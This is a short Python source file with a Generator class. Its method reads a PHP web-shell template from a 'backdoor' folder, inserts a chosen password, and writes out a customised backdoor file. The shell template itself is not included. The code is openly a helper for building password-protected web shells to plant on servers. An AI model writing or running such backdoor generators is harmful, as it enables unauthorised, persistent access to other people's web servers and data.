import sys

class Generator:
	def __init__(self,name,password):
		self.password = password
		self.name = name
	
	def php(self):
		try:
			file = open("out/"+self.name, 'w')
			file.close()
			with open('backdoor/shell.php') as f:
				with open("out/"+self.name, "w") as f1:
					for line in f:
						if "<password>" in line:
							f1.write("protected static $password = '"+self.password+"';")
						else:
							f1.write(line)
		except:
			return False
		return True
